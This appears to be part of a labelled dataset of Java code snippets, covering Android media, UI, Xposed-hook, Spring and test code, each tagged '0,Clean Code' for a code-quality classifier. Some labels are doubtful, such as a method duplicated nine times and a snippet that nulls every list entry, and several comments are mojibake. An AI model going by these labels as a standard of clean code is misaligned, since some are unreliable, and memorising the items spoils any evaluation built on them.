  mVideoSurface.setSurfaceTextureListener(new SurfaceTextureListener(){
    @Override public void onSurfaceTextureAvailable(    SurfaceTexture surface,    int width,    int height){
      if (mMediaPlaybackCallback != null) {
        mMediaPlaybackCallback.surfaceCreated(new TextureViewSurfaceHolder(new Surface(surface)));
      }
      mState=SURFACE_CREATED;
    }
    @Override public void onSurfaceTextureSizeChanged(    SurfaceTexture surface,    int width,    int height){
      if (mMediaPlaybackCallback != null) {
        mMediaPlaybackCallback.surfaceChanged(new TextureViewSurfaceHolder(new Surface(surface)),4,width,height);
      }
    }
    @Override public boolean onSurfaceTextureDestroyed(    SurfaceTexture surface){
      if (mMediaPlaybackCallback != null) {
        mMediaPlaybackCallback.surfaceDestroyed(new TextureViewSurfaceHolder(new Surface(surface)));
      }
      mState=SURFACE_NOT_CREATED;
      return true;
    }
    @Override public void onSurfaceTextureUpdated(    SurfaceTexture surface){
    }
  }
);
}",0,Clean Code
"private void setupWindowBlurListener(AlertDialog dialog){
  var window=dialog.getWindow();
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
    window.addFlags(WindowManager.LayoutParams.FLAG_BLUR_BEHIND);
    Consumer<Boolean> windowBlurEnabledListener=enabled -> updateWindowForBlurs(window,enabled);
    window.getDecorView().addOnAttachStateChangeListener(new View.OnAttachStateChangeListener(){
      @Override public void onViewAttachedToWindow(      @NonNull View v){
        window.getWindowManager().addCrossWindowBlurEnabledListener(windowBlurEnabledListener);
      }
      @Override public void onViewDetachedFromWindow(      @NonNull View v){
        window.getWindowManager().removeCrossWindowBlurEnabledListener(windowBlurEnabledListener);
      }
    }
);
  }
 else   if (Build.VERSION.SDK_INT == Build.VERSION_CODES.R) {
    dialog.setOnShowListener(d -> updateWindowForBlurs(window,supportBlur));
  }
}
",0,Clean Code
"@Subscribe public void bwtSyncStatus(BwtSyncStatusEvent event){
  if (connectionService != null && connectionService.isRunning() && event.getProgress() < 100) {
    DateFormat dateFormat=new SimpleDateFormat(""yyyy/MM/dd HH:mm"");
    appendText(""\nThe connection to the Bitcoin Core node was successful, but it is still syncing and cannot be used yet."");
    appendText(""\nCurrently "" + event.getProgress() + ""% completed to date ""+ dateFormat.format(event.getTip()));
    connectionService.cancel();
  }
}",0,Clean Code
"@Override protected void onActivityResult(int requestCode,int resultCode,Intent data){
  super.onActivityResult(requestCode,resultCode,data);
  if (data == null)   return;
  SharedPreferences prefs=getDefaultSharedPreferences(createDeviceProtectedStorageContext());
switch (requestCode) {
case REQUEST_IMPORT:
    try {
      PrefManager.importPath(prefs,getContentResolver().openInputStream(data.getData()));
      AppUtils.Restart(""systemui"");
    }
 catch (    Exception ignored) {
    }
  break;
case REQUEST_EXPORT:
try {
  PrefManager.exportPrefs(prefs,getContentResolver().openOutputStream(data.getData()));
}
 catch (Exception ignored) {
}
break;
}
}
",0,Clean Code
"public List<String> getScopeList(){
  if (scopeList != null)   return scopeList;
  List<String> list=null;
  try {
    int scopeListResourceId=app.metaData.getInt(""xposedscope"");
    if (scopeListResourceId != 0) {
      list=Arrays.asList(pm.getResourcesForApplication(app).getStringArray(scopeListResourceId));
    }
 else {
      String scopeListString=app.metaData.getString(""xposedscope"");
      if (scopeListString != null)       list=Arrays.asList(scopeListString.split("";""));
    }
  }
 catch (  Exception ignored) {
  }
  if (list == null) {
    OnlineModule module=RepoLoader.getInstance().getOnlineModule(packageName);
    if (module != null && module.getScope() != null) {
      list=module.getScope();
    }
  }
  if (list != null) {
    list.replaceAll(s -> null);
    scopeList=list;
  }
  return scopeList;
}",0,Clean Code
"/** 
 * Filter out modes that has same width.<br/> Reverse order is important because of later mapping by fps in other method.
 */
private ArrayList<Mode> filterModesByWidth(Mode[] allModes,int videoWidth){
  ArrayList<Mode> newModes=new ArrayList<>();
  if (videoWidth == -1) {
    return newModes;
  }
  Arrays.sort(allModes,(mode1,mode2) -> {
    int width1=mode1.getPhysicalWidth();
    int width2=mode2.getPhysicalWidth();
    return width2 - width1;
  }
);
  for (  Mode mode : allModes) {
    int width=mode.getPhysicalWidth();
    if (width >= (videoWidth - 100)) {
      newModes.add(mode);
    }
  }
  if (newModes.isEmpty()) {
    Log.i(TAG,""MODE CANDIDATES NOT FOUND!! Old modes: "" + Arrays.asList(allModes));
  }
 else {
    Log.i(TAG,""FOUND MODE CANDIDATES! New modes: "" + newModes);
  }
  return newModes;
}",0,Clean Code
"/** 
 * Registers the receiver, meaning it will notify the listener when audio capability changes occur. The current audio capabilities will be returned. It is important to call {@link #unregister} when the receiver is no longer required.
 * @return The current audio capabilities for the device.
 */
@SuppressWarnings(""InlinedApi"") public AudioCapabilities register(){
  if (registered) {
    return Assertions.checkNotNull(audioCapabilities);
  }
  registered=true;
  if (externalSurroundSoundSettingObserver != null) {
    externalSurroundSoundSettingObserver.register();
  }
  Intent stickyIntent=null;
  if (receiver != null) {
    IntentFilter intentFilter=new IntentFilter(AudioManager.ACTION_HDMI_AUDIO_PLUG);
    stickyIntent=context.registerReceiver(receiver,intentFilter,null,handler);
  }
  audioCapabilities=AudioCapabilities.getCapabilities(context,stickyIntent);
  return audioCapabilities;
}
public void register(){
  resolver.registerContentObserver(settingUri,false,this);
}
",0,Clean Code
"@SuppressWarnings(""UnusedAssignment"") @Test void genericsAndAnyParameters(){
  rewriteRun(spec -> spec.recipe(toRecipe(() -> new JavaVisitor<>(){
    @Override public J visitLiteral(    J.Literal literal,    ExecutionContext executionContext){
      if (literal.getMarkers().findFirst(SearchResult.class).isEmpty() && (Objects.equals(literal.getValue(),1) || Objects.requireNonNull(literal.getValue()).equals(""s""))) {
        return JavaTemplate.apply(""java.util.List.of(#{any()})"",getCursor(),literal.getCoordinates().replace(),SearchResult.found(literal));
      }
      return super.visitLiteral(literal,executionContext);
    }
  }
)),java(null,null,sourceSpecs -> sourceSpecs.afterRecipe(cu -> new JavaIsoVisitor<>(){
    @SuppressWarnings(""DataFlowIssue"") @Override public <M extends Marker>M visitMarker(    Marker marker,    Object o){
      if (marker instanceof SearchResult) {
        J.Literal literal=getCursor().getValue();
        Expression parent=getCursor().getParentTreeCursor().getValue();
        if (literal.getType() == JavaType.Primitive.Int) {
          assertThat(parent.getType().toString()).isEqualTo(""java.util.List<java.lang.Integer>"");
        }
 else         if (literal.getType() == JavaType.Primitive.String) {
          assertThat(parent.getType().toString()).isEqualTo(""java.util.List<java.lang.String>"");
        }
      }
      return super.visitMarker(marker,o);
    }
  }
.visit(cu,0))));
}",0,Clean Code
"/** 
 * Clears a track selection override for the specified renderer and  {@link TrackGroupArray}.
 * @param rendererIndex The renderer index.
 * @param groups The {@link TrackGroupArray} for which the override should be cleared.
 * @return This builder.
 */
public final ParametersBuilder clearSelectionOverride(int rendererIndex,TrackGroupArray groups){
  Map<TrackGroupArray,SelectionOverride> overrides=selectionOverrides.get(rendererIndex);
  if (overrides == null || !overrides.containsKey(groups)) {
    return this;
  }
  overrides.remove(groups);
  if (overrides.isEmpty()) {
    selectionOverrides.remove(rendererIndex);
  }
  return this;
}
/** 
 * @deprecated Use {@link ParametersBuilder#clearSelectionOverride(int,TrackGroupArray)}. 
 */
@Deprecated public final void clearSelectionOverride(int rendererIndex,TrackGroupArray groups){
  setParameters(buildUponParameters().clearSelectionOverride(rendererIndex,groups));
}
",0,Clean Code
"/** 
 * Q&A interface stream form
 * @param chatMessages
 * @param eventSourceListener
 */
public void streamCompletions(List<FastChatMessage> chatMessages,EventSourceListener eventSourceListener){
  if (CollectionUtils.isEmpty(chatMessages)) {
    log.error(""param error锛欶ast Chat Prompt cannot be empty"");
    throw new ParamBusinessException(""prompt"");
  }
  if (Objects.isNull(eventSourceListener)) {
    log.error(""param error锛欶astChatEventSourceListener cannot be empty"");
    throw new ParamBusinessException();
  }
  log.info(""Fast Chat AI, prompt:{}"",chatMessages.get(chatMessages.size() - 1).getContent());
  try {
    FastChatCompletionsOptions chatCompletionsOptions=new FastChatCompletionsOptions(chatMessages);
    chatCompletionsOptions.setStream(true);
    chatCompletionsOptions.setModel(this.model);
    EventSource.Factory factory=EventSources.createFactory(this.okHttpClient);
    ObjectMapper mapper=new ObjectMapper();
    mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES,false);
    String requestBody=mapper.writeValueAsString(chatCompletionsOptions);
    Request request=new Request.Builder().url(apiHost).post(RequestBody.create(MediaType.parse(ContentType.JSON.getValue()),requestBody)).build();
    EventSource eventSource=factory.newEventSource(request,eventSourceListener);
    log.info(""finish invoking fast chat ai"");
  }
 catch (  Exception e) {
    log.error(""fast chat ai error"",e);
    eventSourceListener.onFailure(null,e,null);
    throw new ParamBusinessException();
  }
}",0,Clean Code
"/** 
 * 閲嶅啓initContext锛涘浜巋ttp璇锋眰锛沚efore浜嬩欢閲岄潰
 * @param event 浜嬩欢
 */
@Override protected boolean sample(Event event){
  if (!MoonboxRepeatCache.isRepeatFlow(Tracer.getTraceId()) && entrance && event instanceof BeforeEvent) {
    BeforeEvent beforeEvent=(BeforeEvent)event;
    try {
      Object request=beforeEvent.argumentArray[0];
      Object response=beforeEvent.argumentArray[1];
      if (!(request instanceof HttpServletRequest && response instanceof HttpServletResponse)) {
        return false;
      }
      HttpServletRequest req=(HttpServletRequest)request;
      List<HttpRecordInterface> patterns=MOONBOX_CONTEXT.getConfig().getHttpEntrancePatterns();
      if (!matchRequestUriAndSample(patterns,req.getRequestURI())) {
        ContextResourceClear.sampleFalse();
        return false;
      }
      return Tracer.getContext().inTimeSample(invokeType);
    }
 catch (    Exception e) {
      log.error(""error occurred when init dubbo invocation"",e);
      ContextResourceClear.sampleFalse();
      return false;
    }
  }
 else {
    return super.sample(event);
  }
}",0,Clean Code
"public void openKeyboardInternal(){
  if (hasBotWebView() && botCommandsMenuIsShowing()) {
    return;
  }
  showPopup(AndroidUtilities.usingHardwareInput || AndroidUtilities.isInMultiwindow || parentFragment != null && parentFragment.isInBubbleMode() || isPaused ? 0 : 2,0);
  if (delegate != null) {
    delegate.onKeyboardRequested();
  }
  if (messageEditText != null) {
    messageEditText.requestFocus();
  }
  AndroidUtilities.showKeyboard(messageEditText);
  if (isPaused) {
    showKeyboardOnResume=true;
  }
 else   if (!AndroidUtilities.usingHardwareInput && !keyboardVisible && !AndroidUtilities.isInMultiwindow&& (parentFragment == null || !parentFragment.isInBubbleMode())) {
    waitingForKeyboardOpen=true;
    if (emojiView != null) {
      emojiView.onTouchEvent(MotionEvent.obtain(SystemClock.uptimeMillis(),SystemClock.uptimeMillis(),MotionEvent.ACTION_CANCEL,0,0,0));
    }
    AndroidUtilities.cancelRunOnUIThread(openKeyboardRunnable);
    AndroidUtilities.runOnUIThread(openKeyboardRunnable,100);
  }
}",0,Clean Code
"@Override @RequestMapping(value=""selectContalDistanceListByQuery"",method=RequestMethod.GET) public ResponseResult selectContalDistanceListByQuery(CfChargingStationQuery cfChargingStationQuery) throws Exception {
  if (cfChargingStationQuery.getPositionX() == null || cfChargingStationQuery.getPositionY() == null) {
    return new ResponseResult(CommonCode.INVALID_PARAM,null,""璇锋彁渚涚粡绾害"");
  }
  if (cfChargingStationQuery.getDistance() == null || cfChargingStationQuery.getDistance().doubleValue() < 0d || cfChargingStationQuery.getDistance().doubleValue() > 8000) {
    return new ResponseResult(CommonCode.INVALID_PARAM,null,""鍙兘鎷夊彇闄勮繎0-8000绫崇殑璁惧鏁版嵁"");
  }
  List<CfChargingStation> cfChargingStations=cfChargingStationService.selectContalDistanceListByQuery(cfChargingStationQuery);
  if (cfChargingStations == null || cfChargingStations.size() == 0) {
    return new ResponseResult(CommonCode.NO_MORE_DATAS,null);
  }
  return new ResponseResult(CommonCode.SUCCESS,cfChargingStations);
}",0,Clean Code
"private void updateSpoutput(){
  BlockState blockState=getBlockState();
  Direction currentFacing=blockState.getValue(BasinBlock.FACING);
  Direction newFacing=Direction.DOWN;
  for (  Direction test : Iterate.horizontalDirections) {
    boolean canOutputTo=BasinBlock.canOutputTo(level,worldPosition,test);
    if (canOutputTo && !disabledSpoutputs.contains(test))     newFacing=test;
  }
  if (preferredSpoutput != null && BasinBlock.canOutputTo(level,worldPosition,preferredSpoutput) && preferredSpoutput != Direction.UP)   newFacing=preferredSpoutput;
  if (newFacing == currentFacing)   return;
  level.setBlockAndUpdate(worldPosition,blockState.setValue(BasinBlock.FACING,newFacing));
  if (newFacing.getAxis().isVertical())   return;
  for (int slot=0; slot < outputInventory.getSlots(); slot++) {
    ItemStack extractItem=outputInventory.extractItem(slot,64,true);
    if (extractItem.isEmpty())     continue;
    if (acceptOutputs(ImmutableList.of(extractItem),Collections.emptyList(),true))     acceptOutputs(ImmutableList.of(outputInventory.extractItem(slot,64,false)),Collections.emptyList(),false);
  }
  IFluidHandler handler=outputTank.getCapability().orElse(null);
  for (int slot=0; slot < handler.getTanks(); slot++) {
    FluidStack fs=handler.getFluidInTank(slot).copy();
    if (fs.isEmpty())     continue;
    if (acceptOutputs(Collections.emptyList(),ImmutableList.of(fs),true)) {
      handler.drain(fs,FluidAction.EXECUTE);
      acceptOutputs(Collections.emptyList(),ImmutableList.of(fs),false);
    }
  }
  notifyChangeOfContents();
  notifyUpdate();
}",0,Clean Code
"@Override public void onInfo(MediaRecorder mediaRecorder,int what,int extra){
  if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED || what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED || what == MediaRecorder.MEDIA_RECORDER_INFO_UNKNOWN) {
    MediaRecorder tempRecorder=recorder;
    recorder=null;
    if (tempRecorder != null) {
      tempRecorder.stop();
      tempRecorder.release();
    }
    if (onVideoTakeCallback != null) {
      finishRecordingVideo(true);
    }
  }
}
",0,Clean Code
"/** 
 * 杞崲涓烘暟鎹簱涓瓨鍌ㄧ殑 envId
 * @return string
 */
@Override public String toString(){
  List<String> arr=new ArrayList<>();
  if (StringUtils.isNotEmpty(clusterId)) {
    arr.add(String.join("":"",Arrays.asList(KEY_CLUSTER,clusterId)));
  }
  if (StringUtils.isNotEmpty(namespaceId)) {
    arr.add(String.join("":"",Arrays.asList(KEY_NAMESPACE,namespaceId)));
  }
  if (StringUtils.isNotEmpty(stageId)) {
    arr.add(String.join("":"",Arrays.asList(KEY_STAGE,stageId)));
  }
  if (arr.size() > 0) {
    return String.join(""::"",arr);
  }
 else {
    return """";
  }
}",0,Clean Code
"public void updateSelectorBackground(boolean top,boolean bottom){
  if (this.top == top && this.bottom == bottom) {
    return;
  }
  this.top=top;
  this.bottom=bottom;
  updateBackground();
}
public void updateSelectorBackground(boolean top,boolean bottom,int selectorRad){
  if (this.top == top && this.bottom == bottom && this.selectorRad == selectorRad) {
    return;
  }
  this.top=top;
  this.bottom=bottom;
  this.selectorRad=selectorRad;
  updateBackground();
}
",0,Clean Code
"@Override protected void onDetachedFromWindow(){
  super.onDetachedFromWindow();
  try {
    if ((!PipVideoOverlay.isVisible() || webView.getVisibility() != VISIBLE) && webView.getParent() != null) {
      removeView(webView);
      webView.stopLoading();
      webView.loadUrl(""about:blank"");
      webView.destroy();
    }
    if (!videoView.isInline() && !PipVideoOverlay.isVisible()) {
      if (instance == EmbedBottomSheet.this) {
        instance=null;
      }
      videoView.destroy();
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
}
",0,Clean Code
"@Test(expected=ConductorClientException.class) public void testEmptyCreateWorkflowDef(){
  try {
    WorkflowDef workflowDef=new WorkflowDef();
    metadataClient.registerWorkflowDef(workflowDef);
  }
 catch (  ConductorClientException e) {
    assertEquals(400,e.getStatus());
    assertEquals(""Validation failed, check below errors for detail."",e.getMessage());
    assertFalse(e.isRetryable());
    List<ValidationError> errors=e.getValidationErrors();
    List<String> errorMessages=errors.stream().map(ValidationError::getMessage).collect(Collectors.toList());
    assertTrue(errorMessages.contains(""WorkflowDef name cannot be null or empty""));
    assertTrue(errorMessages.contains(""WorkflowTask list cannot be empty""));
    throw e;
  }
}",0,Clean Code
"static List<? extends AnnotationDescription> forceDynamicTyping(List<? extends AnnotationDescription> declaredAnnotations){
  return declaredAnnotations.stream().map(ForceDynamicallyTypedAssignReturnedFactory::forceDynamicTyping).collect(Collectors.toList());
}
private static AnnotationDescription forceDynamicTyping(AnnotationDescription anno){
  String name=anno.getAnnotationType().getName();
  if (name.equals(TO_FIELD_TYPENAME) || name.equals(TO_ARGUMENT_TYPENAME) || name.equals(TO_THIS_TYPENAME)|| name.equals(TO_ALL_ARGUMENTS_TYPENAME)|| name.equals(TO_RETURNED_TYPENAME)|| name.equals(TO_THROWN_TYPENAME)) {
    return replaceAnnotationValue(anno,""typing"",oldVal -> AnnotationValue.ForEnumerationDescription.of(DYNAMIC_TYPING));
  }
 else   if (name.equals(TO_FIELDS_TYPENAME) || name.equals(TO_ARGUMENTS_TYPENAME)) {
    return replaceAnnotationValue(anno,""value"",oldVal -> {
      if (!oldVal.getState().isDefined()) {
        return null;
      }
      AnnotationDescription[] resolve=(AnnotationDescription[])oldVal.resolve();
      if (resolve.length == 0) {
        return oldVal;
      }
      AnnotationDescription[] newValueList=Arrays.stream(resolve).map(ForceDynamicallyTypedAssignReturnedFactory::forceDynamicTyping).toArray(AnnotationDescription[]::new);
      TypeDescription subType=newValueList[0].getAnnotationType();
      return AnnotationValue.ForDescriptionArray.of(subType,newValueList);
    }
);
  }
  return anno;
}",0,Clean Code
"public Criteria andGmtModifiedNotBetween(Date value1,Date value2){
  addCriterion(""gmt_modified not between"",value1,value2,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotBetween(Date value1,Date value2){
  addCriterion(""gmt_modified not between"",value1,value2,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotBetween(Date value1,Date value2){
  addCriterion(""gmt_modified not between"",value1,value2,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotBetween(Date value1,Date value2){
  addCriterion(""gmt_modified not between"",value1,value2,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotBetween(Date value1,Date value2){
  addCriterion(""gmt_modified not between"",value1,value2,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotBetween(Date value1,Date value2){
  addCriterion(""gmt_modified not between"",value1,value2,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotBetween(Date value1,Date value2){
  addCriterion(""gmt_modified not between"",value1,value2,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotBetween(Date value1,Date value2){
  addCriterion(""gmt_modified not between"",value1,value2,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotBetween(Date value1,Date value2){
  addCriterion(""gmt_modified not between"",value1,value2,""gmtModified"");
  return (Criteria)this;
}",0,Clean Code
"private static void postBindApplication(ActivityThread activityThread){
  SuiApk suiApk=SuiApk.createForSettings();
  if (suiApk == null) {
    LOGGER.e(""Cannot load apk"");
    return;
  }
  Instrumentation instrumentation=ActivityThreadUtil.getInstrumentation(activityThread);
  SettingsInstrumentation newInstrumentation=new SettingsInstrumentation(instrumentation,suiApk);
  ActivityThreadUtil.setInstrumentation(activityThread,newInstrumentation);
  LOGGER.d(""setInstrumentation: %s -> %s"",instrumentation,newInstrumentation);
  Application application=activityThread.getApplication();
  if (application == null) {
    LOGGER.e(""Application is null after bindApplication, cannot add shortcut"");
    return;
  }
  Resources resources=newInstrumentation.getResources();
  if (resources != null) {
    handlerThread=new HandlerThread(""Sui"");
    handlerThread.start();
    handler=new Handler(handlerThread.getLooper());
    handler.post(() -> shortcutStuff(application,resources));
  }
}
",0,Clean Code
"/** 
 * Set whether the content scrim and/or status bar scrim should be shown or not. Any change in the vertical scroll may overwrite this value. Any visibility change will be animated if this view has already been laid out.
 * @param shown whether the scrims should be shown
 * @see #getStatusBarScrim()
 * @see #getContentScrim()
 */
public void setScrimsShown(boolean shown){
  setScrimsShown(shown,ViewCompat.isLaidOut(this) && !isInEditMode());
}
/** 
 * Set whether the content scrim and/or status bar scrim should be shown or not. Any change in the vertical scroll may overwrite this value.
 * @param shown   whether the scrims should be shown
 * @param animate whether to animate the visibility change
 * @see #getStatusBarScrim()
 * @see #getContentScrim()
 */
public void setScrimsShown(boolean shown,boolean animate){
  if (scrimsAreShown != shown) {
    if (animate) {
      animateScrim(shown ? 0xFF : 0x0);
    }
 else {
      setScrimAlpha(shown ? 0xFF : 0x0);
    }
    scrimsAreShown=shown;
  }
}",0,Clean Code
"/** 
 * Constructs a KMeansPlusPlusFloatClusterer with the specified points and number of clusters.
 * @param points the points to cluster (points[n][i] is the ith component of the nth point)
 * @param k number of clusters.
 */
public KMeansPlusPlusClusterer(VectorFloat<?>[] points,int k){
  this(points,chooseInitialCentroids(points,k),UNWEIGHTED);
}
public KMeansPlusPlusClusterer(VectorFloat<?>[] points,int k,float anisotropicThreshold){
  this(points,chooseInitialCentroids(points,k),anisotropicThreshold);
}
/** 
 * Constructs a KMeansPlusPlusFloatClusterer with the specified points and initial centroids. <p> The initial centroids provided as a parameter are copied before modification.
 * @param points the points to cluster (points[n][i] is the ith component of the nth point)
 * @param centroids the initial centroids.
 * @param anisotropicThreshold the threshold of relevance for anisotropic angular distance shaping, givinghigher priority to parallel error.  Anisotropic shaping requires that your dataset be normalized to unit length.  Use a threshold of `UNWEIGHTED` for normal isotropic L2 distance. anisotropicThreshold is only valid when the supplied points are normalized to unit length.
 */
public KMeansPlusPlusClusterer(VectorFloat<?>[] points,VectorFloat<?> centroids,float anisotropicThreshold){
  if (Float.isNaN(anisotropicThreshold) || anisotropicThreshold < -1.0 || anisotropicThreshold >= 1.0) {
    throw new IllegalArgumentException(""Valid range for anisotropic threshold T is -1.0 <= t < 1.0"");
  }
  this.points=points;
  this.k=centroids.length() / points[0].length();
  this.centroids=centroids.copy();
  this.anisotropicThreshold=anisotropicThreshold;
  centroidDenoms=new int[k];
  centroidNums=new VectorFloat<?>[k];
  for (int i=0; i < centroidNums.length; i++) {
    centroidNums[i]=vectorTypeSupport.createFloatVector(points[0].length());
  }
  assignments=new int[points.length];
  initializeAssignedPoints();
}",0,Clean Code
"public static int getIndexOf(String[] str1,String[] str2){
  if (str1 == null || str2 == null || str1.length < 1 || str1.length < str2.length) {
    return -1;
  }
  int x=0;
  int y=0;
  int[] next=getNextArray(str2);
  while (x < str1.length && y < str2.length) {
    if (isEqual(str1[x],str2[y])) {
      x++;
      y++;
    }
 else     if (next[y] == -1) {
      x++;
    }
 else {
      y=next[y];
    }
  }
  return y == str2.length ? x - y : -1;
}",0,Clean Code
"public boolean setButtonsMode(int mode){
  if (mode == GameButton.MODE_GAME || mode == GameButton.MODE_MOVEABLE_EDITABLE || mode == GameButton.MODE_PREVIEW) {
    for (    GameButton g : buttonList) {
      g.setButtonMode(mode);
    }
    this.buttonMode=mode;
    return true;
  }
 else {
    return false;
  }
}
",0,Clean Code
"@Test public void allMethods() throws InterruptedException, ExecutionException {
  int taskCount=10000;
  int threadCount=20;
  StopWatch stopWatch=new StopWatch();
  stopWatch.start(""thread"");
  Assert.assertEquals(taskCount,thread(taskCount,threadCount));
  stopWatch.stop();
  stopWatch.start(""threadpool"");
  Assert.assertEquals(taskCount,threadpool(taskCount,threadCount));
  stopWatch.stop();
  stopWatch.start(""stream"");
  Assert.assertEquals(taskCount,stream(taskCount,threadCount));
  stopWatch.stop();
  stopWatch.start(""forkjoin"");
  Assert.assertEquals(taskCount,forkjoin(taskCount,threadCount));
  stopWatch.stop();
  stopWatch.start(""completableFuture"");
  Assert.assertEquals(taskCount,completableFuture(taskCount,threadCount));
  stopWatch.stop();
  log.info(stopWatch.prettyPrint());
}",0,Clean Code
"@Override public boolean initOnce() throws Exception {
  final Class<?> mEmoAddedAuthCallback=_EmoAddedAuthCallback();
  final Class<?> mFavEmoRoamingHandler=_FavEmoRoamingHandler();
  if (mEmoAddedAuthCallback == null) {
    if (mFavEmoRoamingHandler == null) {
      setEmoNum();
    }
 else {
      XposedHelpers.findAndHookMethod(mFavEmoRoamingHandler,""a"",List.class,List.class,new XC_MethodHook(){
        @Override protected void beforeHookedMethod(        MethodHookParam param) throws Throwable {
          try {
            setEmoNum();
          }
 catch (          Throwable e) {
            traceError(e);
            throw e;
          }
        }
      }
);
    }
  }
 else {
    Class<?> mUpCallBack$SendResult=null;
    for (    Method m : mEmoAddedAuthCallback.getDeclaredMethods()) {
      if (m.getName().equals(""b"") && m.getReturnType().equals(void.class) && m.getParameterTypes().length == 1) {
        mUpCallBack$SendResult=m.getParameterTypes()[0];
        break;
      }
    }
    XposedHelpers.findAndHookMethod(mEmoAddedAuthCallback,""b"",mUpCallBack$SendResult,new XC_MethodHook(){
      @Override protected void beforeHookedMethod(      MethodHookParam param) throws Throwable {
        try {
          Object msg=param.args[0];
          Reflex.setInstanceObject(msg,""a"",int.class,0);
        }
 catch (        Throwable e) {
          traceError(e);
          throw e;
        }
      }
    }
);
    XposedHelpers.findAndHookMethod(mFavEmoRoamingHandler,""a"",List.class,List.class,new XC_MethodHook(){
      @Override protected void beforeHookedMethod(      MethodHookParam param) throws Throwable {
        try {
          setEmoNum();
        }
 catch (        Throwable e) {
          traceError(e);
          throw e;
        }
      }
    }
);
  }
  return true;
}",0,Clean Code
"/** 
 * 初始化
 */
static public void init(){
  _handlerMap.put(GameMsgProtocol.UserEntryCmd.class,new UserEntryCmdHandler());
  _handlerMap.put(GameMsgProtocol.WhoElseIsHereCmd.class,new WhoElseIsHereCmdHandler());
  _handlerMap.put(GameMsgProtocol.UserMoveToCmd.class,new UserMoveToCmdHandler());
}
/** 
 * 初始化
 */
static public void init(){
  LOGGER.info(""==== 完成 Cmd 和 Handler 的关联 ===="");
  final String packageName=CmdHandlerFactory.class.getPackage().getName();
  Set<Class<?>> clazzSet=PackageUtil.listSubClazz(packageName,true,ICmdHandler.class);
  for (  Class<?> clazz : clazzSet) {
    if ((clazz.getModifiers() & Modifier.ABSTRACT) != 0) {
      continue;
    }
    Method[] methodArray=clazz.getDeclaredMethods();
    Class<?> msgType=null;
    for (    Method currMethod : methodArray) {
      if (!currMethod.getName().equals(""handle"")) {
        continue;
      }
      Class<?>[] paramTypeArray=currMethod.getParameterTypes();
      if (paramTypeArray.length < 2 || paramTypeArray[1] == GeneratedMessageV3.class || !GeneratedMessageV3.class.isAssignableFrom(paramTypeArray[1])) {
        continue;
      }
      msgType=paramTypeArray[1];
      break;
    }
    if (null == msgType) {
      continue;
    }
    try {
      ICmdHandler<?> newHandler=(ICmdHandler<?>)clazz.newInstance();
      LOGGER.info(""关联 {} <==> {}"",msgType.getName(),clazz.getName());
      _handlerMap.put(msgType,newHandler);
    }
 catch (    Exception ex) {
      LOGGER.error(ex.getMessage(),ex);
    }
  }
}",0,Clean Code
"private void setCoreServerInConfig(Config config){
  Server existingServer=config.getRecentCoreServers().stream().filter(server -> coreHost.getText().equals(server.getAlias())).findFirst().orElse(null);
  if (existingServer != null) {
    config.setCoreServer(existingServer);
    return;
  }
  String hostAsString=getHost(coreHost.getText());
  Integer portAsInteger=getPort(corePort.getText());
  if (hostAsString != null && !hostAsString.isEmpty() && portAsInteger != null && isValidPort(portAsInteger)) {
    Protocol protocol=portAsInteger == Protocol.HTTPS.getDefaultPort() ? Protocol.HTTPS : Protocol.HTTP;
    config.setCoreServer(new Server(protocol.toUrlString(hostAsString,portAsInteger)));
  }
 else   if (hostAsString != null && !hostAsString.isEmpty()) {
    config.setCoreServer(new Server(Protocol.HTTP.toUrlString(hostAsString)));
  }
 else {
    config.setCoreServer(null);
  }
}
",0,Clean Code
"@RequiresNonNull({""decoderJni"",""extractorOutput"",""trackOutput""}) @EnsuresNonNull({""streamMetadata"",""outputFrameHolder""}) @SuppressWarnings({""contracts.postcondition.not.satisfied""}) private void decodeStreamMetadata(ExtractorInput input) throws InterruptedException, IOException {
  if (streamMetadataDecoded) {
    return;
  }
  FlacStreamMetadata streamMetadata;
  try {
    streamMetadata=decoderJni.decodeStreamMetadata();
  }
 catch (  IOException e) {
    decoderJni.reset(0);
    input.setRetryPosition(0,e);
    throw e;
  }
  streamMetadataDecoded=true;
  if (this.streamMetadata == null) {
    this.streamMetadata=streamMetadata;
    binarySearchSeeker=outputSeekMap(decoderJni,streamMetadata,input.getLength(),extractorOutput);
    Metadata metadata=id3MetadataDisabled ? null : id3Metadata;
    if (streamMetadata.metadata != null) {
      metadata=streamMetadata.metadata.copyWithAppendedEntriesFrom(metadata);
    }
    outputFormat(streamMetadata,metadata,trackOutput);
    outputBuffer.reset(streamMetadata.maxDecodedFrameSize());
    outputFrameHolder=new OutputFrameHolder(ByteBuffer.wrap(outputBuffer.data));
  }
}",0,Clean Code
"protected void replaceVideoRenderer(ArrayList<Renderer> renderers,MediaCodecVideoRenderer videoRenderer){
  if (renderers != null && videoRenderer != null) {
    Renderer originMediaCodecVideoRenderer=null;
    int index=0;
    for (    Renderer renderer : renderers) {
      if (renderer instanceof MediaCodecVideoRenderer) {
        originMediaCodecVideoRenderer=renderer;
        break;
      }
      index++;
    }
    if (originMediaCodecVideoRenderer != null) {
      renderers.remove(originMediaCodecVideoRenderer);
      renderers.add(index,videoRenderer);
    }
  }
}",0,Clean Code
"/** 
 * 淇濆瓨鎴栨柊澧炰俊鎭�
 * @param crmModel model
 */
@Override @Transactional(rollbackFor=Exception.class) public void addOrUpdate(CrmModelSaveBO crmModel,boolean isExcel){
  CrmLeads crmLeads=BeanUtil.copyProperties(crmModel.getEntity(),CrmLeads.class);
  String batchId=StrUtil.isNotEmpty(crmLeads.getBatchId()) ? crmLeads.getBatchId() : IdUtil.simpleUUID();
  actionRecordUtil.updateRecord(crmModel.getField(),Dict.create().set(""batchId"",batchId).set(""dataTableName"",""wk_crm_leads_data""));
  crmLeadsDataService.saveData(crmModel.getField(),batchId);
